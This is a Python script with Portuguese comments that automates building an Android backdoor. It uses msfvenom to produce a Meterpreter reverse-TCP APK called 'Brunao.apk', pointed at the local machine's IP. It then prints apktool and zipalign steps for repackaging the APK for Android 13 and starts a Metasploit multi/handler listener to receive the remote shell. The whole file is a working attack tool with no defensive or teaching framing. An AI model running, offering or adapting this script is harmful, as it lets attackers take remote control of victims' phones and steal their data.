import os
import subprocess
import socket
import re

# Função para pegar o IP privado da máquina
def get_ip():
    try:
        # Usando ifconfig para pegar o IP
        result = subprocess.run(["ifconfig"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.decode("utf-8")
        
        # Procurando pelo endereço IPv4 no ifconfig
        ip_pattern = re.compile(r'inet\s([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)')
        match = ip_pattern.search(output)
        if match:
            return match.group(1)
        else:
            print("Não foi possível obter o IP.")
            return None
    except Exception as e:
        print(f"Erro ao executar o ifconfig: {e}")
        return None

# Função para gerar o APK com o msfvenom
def generate_apk(ip, port=4444):
    output_file = "/path/to/output/Brunao.apk"
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {output_file}"
    
    try:
        subprocess.run(command, shell=True, check=True)
        print(f"APK gerado com sucesso em {output_file}.")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao gerar o APK: {e}")

# Função para instruir o usuário a atualizar o AndroidManifest.xml
def update_manifest():
    print("\nPara atualizar o AndroidManifest.xml para Android 13, faça o seguinte:")
    print("1. Baixe e instale o ApkTool.")
    print("2. Abra o terminal na pasta onde o APK foi gerado e execute o comando:")
    print("   apktool d Brunao.apk")
    print("3. Abra o arquivo 'AndroidManifest.xml' na pasta 'Brunao' gerada e modifique as permissões necessárias para Android 13.")
    print("4. Após modificar, execute o comando:")
    print("   apktool b Brunao")
    print("5. Em seguida, utilize o comando para alinhar o APK:")
    print("   zipalign -v 4 Brunao.apk Brunao.apk")
    print("Após isso, você terá o APK pronto para Android 13.\n")

# Função para executar o Metasploit e iniciar o listener
def start_meterpreter(ip, port=4444):
    print("\nIniciando o Metasploit... Aguarde.")
    msf_command = f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; exploit'"
    
    try:
        subprocess.run(msf_command, shell=True)
        print("Sessão meterpreter iniciada.")
    except Exception as e:
        print(f"Erro ao iniciar o Metasploit: {e}")

# Função para listar os comandos disponíveis
def help_commands():
    print("\nComandos disponíveis para executar no Metasploit:")
    print("1. Para iniciar o listener: 'executar'")
    print("2. Para ver os comandos: 'help'")
    
if __name__ == "__main__":
    print("Iniciando o processo...\n")
    
    # Passo 1: Obter IP da máquina
    ip = get_ip()
    if ip:
        print(f"IP da máquina obtido: {ip}")
        
        # Passo 2: Gerar APK com msfvenom
        generate_apk(ip)
        
        # Passo 3: Instruções para atualizar o AndroidManifest
        update_manifest()
        
        # Passo 4: Iniciar o listener do Metasploit
        start_meterpreter(ip)
        
        # Passo 5: Exibir comandos
        help_commands()
